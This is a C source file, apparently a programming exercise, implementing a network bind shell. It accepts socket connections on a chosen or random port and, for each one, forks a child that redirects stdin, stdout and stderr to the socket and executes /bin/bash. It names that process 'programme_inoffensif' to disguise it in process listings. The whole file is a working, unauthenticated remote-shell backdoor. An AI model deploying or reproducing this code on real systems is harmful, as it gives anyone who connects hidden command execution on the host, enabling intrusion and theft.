#include "common.h"
#include "utils_v2.h"
#include "server.h"

/**
 * Child processus which execute the command bash received through the given
 * socket.
 *
 * PRE: sockfd: a valid socket file descriptor.
 * POST: execute the command bash.
 */
void childExec(void *sockfd);

/**
 * Closes all the sockets in tabSockets
 *
 * PRE: tabSockets: contains all the open sockets, nbSockets:
 * POST:
 **/
void disconnect(int *tabSockets);

/**
 * Kill all the bash shells with a SIGTERM signal.
 *
 **/
void killThemAll(int *tabChilds, int nbChilds);

/**
 * Handler when received SIGTERM.
 *
 **/
void endSeverHandler(int sig);

volatile sig_atomic_t end = 0;

int main(int argc, char **argv) {
  int sockfd, newsockfd, port, ret, nbSockets = 0, i = 0, nbChilds = 0;
  int randomInt = randomIntBetween(0, 9);
  char msg[SIZE_MESSAGE];
  int tabSockets[MAX_CONNECTIONS];
  pid_t tabChilds[10];

  ssigaction(SIGTERM, endSeverHandler);

  if (argc > 1) {
    port = atoi(argv[1]);
    sockfd = initSocketServer(port);
  } else {
    port = TAB_PORTS[randomInt];
    sockfd = initSocketServer(port);
  }

  printf("The server listens on the port : %d \n", port);

  while (end == 0) {
    newsockfd = accept(sockfd, NULL, NULL);

    if (newsockfd == -1) {
      break;
    } else if (newsockfd > 0) {
      tabSockets[i] = newsockfd;
      i++;
      tabChilds[nbChilds] = fork_and_run1(childExec, &newsockfd);
      nbChilds++;
    }
  }

  // disconnect(tabSockets);
  killThemAll(tabChilds, nbChilds);
  sclose(sockfd);
  return 0;
}

// child process run the command
void childExec(void *sockfd) {
  int newsockfd = *(int *)sockfd;

  dup2(newsockfd, STDIN_FILENO);
  dup2(newsockfd, STDOUT_FILENO);
  dup2(newsockfd, STDERR_FILENO);

  sclose(newsockfd);
  sexecl("/bin/bash", "programme_inoffensif", NULL);
}


// closing all the open sockets
void disconnect(int *tabSockets) {
  for (int i = 0; i < MAX_CONNECTIONS; i++) {
    sclose(tabSockets[i]);
  }
}

// kill all the bash shells
void killThemAll(int *tabChilds, int nbChilds) {
  for (int i = 0; i < nbChilds; i++) {
    skill(tabChilds[i], SIGTERM);
    swaitpid(tabChilds[i], NULL, 0);
  }
}

// handler when received SIGTERM
void endSeverHandler(int sig) { end = 1; }
